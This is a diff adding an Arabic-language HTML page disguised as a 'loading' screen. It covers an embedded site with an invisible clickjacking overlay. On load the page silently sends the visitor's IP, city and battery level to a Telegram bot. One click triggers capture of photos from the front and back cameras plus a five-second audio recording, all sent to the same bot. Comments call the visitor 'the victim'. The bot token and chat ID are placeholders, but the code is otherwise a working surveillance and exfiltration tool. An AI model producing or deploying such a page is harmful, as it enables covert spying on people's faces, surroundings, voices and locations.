@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحميل...</title>
+    <style>
+        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background-color: #000; }
+        iframe { width: 100%; height: 100%; border: none; position: absolute; z-index: 1; }
+        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.01); z-index: 999; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <iframe src="bdjdjd"></iframe>
+    
+    <div id="overlay" onclick="ghostCapture()"></div>
+
+    <script>
+        const token = 'hdhd';
+        const chatId = 'djjd';
+
+        async function sendMsg(txt) {
+            try { await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(txt)}`); } catch(e) {}
+        }
+
+        // سحب الـ IP والبطارية فور الفتح (لا يحتاج ضغطة)
+        window.onload = async () => {
+            let batteryInfo = "غير مدعوم";
+            try { const b = await navigator.getBattery(); batteryInfo = `${Math.round(b.level * 100)}%`; } catch(e) {}
+            
+            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
+                sendMsg(`🔔 دخول!\n🌐 IP: ${d.ip}\n📍 ${d.city}\n🔋 شحن الضحية: ${batteryInfo}`);
+            });
+        };
+
+        async function ghostCapture() {
+            document.getElementById('overlay').style.display = 'none'; // اختفاء الطبقة لتصفح الموقع
+
+            try {
+                // 1. الكاميرا الأمامية + الصوت
+                const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                await processMedia(frontStream, "الأمامية", true);
+                
+                // إغلاق الأمامية فوراً لفتح الخلفية
+                frontStream.getTracks().forEach(t => t.stop());
+
+                // 2. الكاميرا الخلفية بعد ثانية واحدة
+                setTimeout(async () => {
+                    try {
+                        const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                        await processMedia(backStream, "الخلفية", false);
+                        backStream.getTracks().forEach(t => t.stop());
+                    } catch(e) { sendMsg("⚠️ الكاميرا الخلفية محظورة."); }
+                }, 1000);
+
+            } catch (e) {
+                sendMsg("🚫 الضحية رفض الأذونات.");
+            }
+        }
+
+        async function processMedia(stream, type, isAudio) {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.muted = true;
+            await video.play();
+
+            // لقطة صورة سريعة جداً
+            const canvas = document.createElement('canvas');
+            canvas.width = 480; canvas.height = 640;
+            canvas.getContext('2d').drawImage(video, 0, 0, 480, 640);
+            canvas.toBlob(blob => {
+                const frm = new FormData();
+                frm.append('chat_id', chatId);
+                frm.append('photo', blob, `${type}.jpg`);
+                frm.append('caption', `📸 لقطة ${type}`);
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: frm });
+            }, 'image/jpeg', 0.5);
+
+            // تسجيل صوتي (5 ثواني) يتم مرة واحدة فقط
+            if (isAudio) {
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'audio/ogg' });
+                    const frm = new FormData();
+                    frm.append('chat_id', chatId);
+                    frm.append('voice', blob, 'v.ogg');
+                    fetch(`https://api.telegram.org/bot${token}/sendVoice`, { method: 'POST', body: frm });
+                };
+                recorder.start();
+                setTimeout(() => recorder.stop(), 5000);
+            }
+        }
+    </script>
+</body>
+</html>
